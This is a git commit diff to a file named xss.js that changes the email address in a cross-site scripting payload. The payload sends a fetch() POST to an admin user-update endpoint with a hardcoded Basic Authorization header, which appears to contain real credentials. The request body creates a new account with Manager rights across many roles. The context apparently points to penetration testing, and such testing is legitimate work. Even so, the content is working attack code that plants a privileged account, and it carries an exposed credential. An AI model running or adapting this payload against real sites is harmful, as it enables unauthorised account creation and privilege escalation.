7af7703c70e39f1495e90667c662579710943949
prasanthpror <75009718+prasanthpror@users.noreply.github.com>
2024-12-18 15:21:06 +0530

    Update xss.js

--- xss.js
+++ xss.js
@@ -4,5 +4,5 @@ fetch('/admin/ajax-user-update', {
     'Content-Type': 'application/x-www-form-urlencoded',
     'Authorization': 'Basic b25lc2hpZnQ6S28jMGY5QGdvbDBLUzY3bQ=='
   },
-  body: 'mode=add&uid=0&active=1&name=test&mobile=98989898&email=r.prasanth+xjxss@appsecure.security&password=123456&user_mgt=Manager&telesales=Manager&purchaser=Manager&direct_sales=Manager&consignment_cst=Manager&assignable=0&c2b_rr=1'
+  body: 'mode=add&uid=0&active=1&name=test&mobile=98989898&email=r.prasanth+xssadmin@appsecure.security&password=123456&user_mgt=Manager&telesales=Manager&purchaser=Manager&direct_sales=Manager&consignment_cst=Manager&assignable=0&c2b_rr=1'
 });
